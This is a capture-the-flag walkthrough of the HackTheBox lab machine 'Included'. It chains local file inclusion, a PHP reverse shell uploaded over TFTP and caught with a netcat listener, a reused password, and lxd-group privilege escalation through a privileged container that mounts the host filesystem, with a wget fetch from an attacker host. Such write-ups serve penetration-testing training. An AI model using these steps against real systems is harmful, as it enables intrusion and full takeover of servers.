---
title: Walkthrough - Included - A HackTheBox machine 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
  - lxd exploitation
  - port 69
  - tftp
  - privilege escalation
---

# Included - A HackTheBox machine

After running a port scan, the only open port is 80.

```bash
nmap -sC -sV $ip -Pn -p-
```

Results:

```
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.95.185/?file=home.php
```


After visiting the site with the browser and examining its code, it's a simple web site. php is used. The endpoint that appears in the scanner has a LFI vulnerability and some files can be read.

Burpsuite request:

```
GET /?file=../../../../../../etc/passwd HTTP/1.1
Host: 10.129.95.185
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

Result:

```
HTTP/1.1 200 OK
Date: Mon, 08 May 2023 07:04:13 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1575
Connection: close
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
mike:x:1000:1000:mike:/home/mike:/bin/bash
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```

Something interesting is that after user mike, there is a service/user: tftp. [Trivial File Transfer Protocol (TFTP)](69-tftp.md) is a simple protocol that provides basic file transfer function with no user authentication. TFTP is intended for applications that do not need the sophisticated interactions that File Transfer Protocol (FTP) provides. It is also revealed that TFTP uses the User Datagram Protocol (UDP) to communicate. This is defined as a lightweight data transport protocol that works on top of IP. 

UDP provides a mechanism to detect corrupt data in packets, but it does not attempt to solve other problems that arise with packets, such as lost or out of order packets. It is implemented in the transport layer of the OSI Model, known as a fast but not reliable protocol, unlike TCP, which is reliable, but slower then UDP. Just like how TCP contains open ports for protocols such as HTTP, FTP, SSH and etcetera, the same way UDP has ports for protocols that work for UDP.

```bash
sudo nmap -sU 10.129.95.185   
```

You can use metasploit or python to check if can upload/download files. Module `auxiliary/admin/tftp/tftp_transfer_util`

And also you can exploit it manually. Install tftp client:

```bash
# Install tftp client
sudo apet install tftp
```

Also, check for manual and available commands:

```bash
man tftp
```

Upload your [pentesmonkey shell](pentesmonkey.md) with:

```tftp
put pentesmonkey.php
```

Where does it get uploaded? Depends. But The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The directory is configured there under the parameter `TFTP_DIRECTORY=`. With that information, you can access the directory and from there launch your reverse shell. 

Let's do it. Request in Burpsuite:

```
GET /?file=../../../../../../etc/default/tftpd-hpa HTTP/1.1
Host: 10.129.95.185
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

Response:

```
HTTP/1.1 200 OK
Date: Mon, 08 May 2023 07:27:32 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 125
Connection: close
Content-Type: text/html; charset=UTF-8

# /etc/default/tftpd-hpa

TFTP_USERNAME="tftp"
TFTP_DIRECTORY="/var/lib/tftpboot"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="-s -l -c"
```

Now, open netcat on one terminal

```bash
nc -lnvp 1234
```

Launch your shell by visiting in the browser:

```
http://10.129.95.185/?file=../../../../../..//var/lib/tftpboot/pentesmonkey.php
```

[Spawn a shell](spawn-a-shell.md).

```bash
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
```

Browse around. Credentials for user mike are at /var/wwww/html/.htpasswd:

```bash
su mike
# Enter password: Sheffield19
```

And get the user.txt flag:

```bash
cd
ls -la
cat user.txt
```

## Privilege escalation

```bash
whoami
pwd
id
groups
uname -a
lsb_release -a
```

Information retrieved:

```
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
groups
mike lxd
uname -a
Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.5 LTS
Release:        18.04
Codename:       bionic
```

After looking for "exploit ubuntu 18.04.5 LTS" there exists [a exploit that uses lxd service](https://www.exploit-db.com/exploits/46978), which makes sense after reading the information retrieved. About [lxd privilege escalation](lxd.md).

LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.

Basically, as mike we belong to group lxd. Let's exploit this:

**Steps to be performed on the attacker machine:**


```bash
# Download build-alpine in your local machine through the git repository:
git clone https://github.com/saghul/lxd-alpine-builder.git

# Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
cd lxd-alpine-builder
sudo ./build-alpine

# This will generate a tar file that you need to transfer to the victim machine. For that you can copy that file to your /var/www/html folder and start apache2 service.
```

**Steps to be performed on the victim machine:**

```bash
# Download the alpine image. Go for instance to the /tmp folder and, if you have started the apache2 service in the attacker machine, do a wget:
wget http://AtackerIP//alpine-v3.17-x86_64-20230508_0532.tar.gz

# After the image is built it can be added as an image to LXD as follows:
lxc image import ./alpine-v3.17-x86_64-20230508_0532.tar.gz --alias myimage

# List available images:
lxc image list

# Initiate your image inside a new container
lxc init myimage ignite -c security.privileged=true

# Mount the container inside the /root directory
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

# Initialize the container
lxc start ignite

# Launch a shell command in the container
lxc exec ignite /bin/sh
```

Now, we should be root:

```bash
whoami
cd /
find . -name root.txt 2>/dev/null
```








